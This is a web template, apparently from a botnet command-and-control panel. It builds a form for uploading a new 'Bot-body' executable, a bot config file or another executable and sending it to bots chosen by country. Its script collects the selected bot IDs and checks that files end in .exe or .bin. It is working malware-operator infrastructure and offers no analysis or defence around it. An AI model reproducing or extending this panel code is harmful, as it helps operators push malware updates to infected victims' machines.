<div id='uploadForm'>
<form  id='frm_updatebot2' action="./mod/upload_file.php"  target="hiddenframe" method="post" enctype="multipart/form-data" onsubmit='return CheckExt();' name='UploadForm'>

<LEGEND align="center">UPLOAD FILE:</LEGEND>
<table border='1' cellspacing='0' cellpadding='3' style='border: 1px solid lightgray; font-size: 9px; border-collapse: collapse; background-color: rgb(255, 255, 240);'>
	<tr align='left' valign='middle'><td>Local file:</td><td>
		<input type="hidden" name="MAX_FILE_SIZE" value="5242880">
		<input type="file" name="file" id="idFile"/>
	</td></tr>
	<tr><td colspan='2' align='center'>
		<input type='radio' name='uptype' value='body'> Bot-body (*.exe)&nbsp; 
		<input type='radio' name='uptype' id='config' value='config' checked> Config (*.bin)&nbsp; 
		<input type='radio' name='uptype' value='exe'> Other exe (*.exe)
	</td></tr>
	<tr align='left'><td colspan='2' align='center'>
		<input type='hidden' name='bots' value='' id='send_bots'>
		<input type="submit" value="Upload" id="btnUpload"/>
	</td></tr>
</table>
<div id='uploadResult'></div>

{if isset($COUNTRIES)}
<a href='javascript:void();' onClick='SelectAll("bots",true);'>Select All</a> 
<a href='javascript:void();' onClick='SelectAll("bots",false);'>Unselect All</a> 
{include file='get_bots.tpl'}
{/if}

</form>
</div>
<iframe id="hiddenframe" name="hiddenframe" style="width:100%; height:0px; border:0px"></iframe>
{literal}
<script>
$("#frm_updatebot2").submit(function() 
{
	var f = document.getElementById('frm_findbots');
	if(f)
	{
		var res = ""; 
		for (var i = 0; i < f.elements.length; i++) 
		{
			var elem = f.elements[i];
			if(elem.type == 'checkbox' && elem.name.substr(0, 4) == 'bots' && elem.checked == true)
			{
				var name = elem.name;
				var num = name.substr(5,name.length);
				num = num.substr(0,num.indexOf(']',0));
				res += num+' ';
			}
		}
		var send = document.getElementById('send_bots');
		if(send) send.value = res;
	}
});
function CheckExt()
{
	file = $("#idFile").val();
	ext = file.substr(file.length-3,3);
	ext = ext.toLowerCase();
	is_config = document.getElementById("config").checked;
	error = document.getElementById("uploadResult");

	if( file == '') { error.innerHTML = '<BR><font class="error">Plz, select file!</font>'; return false; }

	if(is_config)
	{
		if( ext != 'bin' ) { error.innerHTML = '<BR><font class="error">Bad CONFIG extension!</font>'; return false; }
	}
	else
	{
		if( ext != 'exe' ) { error.innerHTML = '<BR><font class="error">Bad extension! Must be *.exe</font>'; return false; }
	}
	return true;
}

</script>
{/literal}	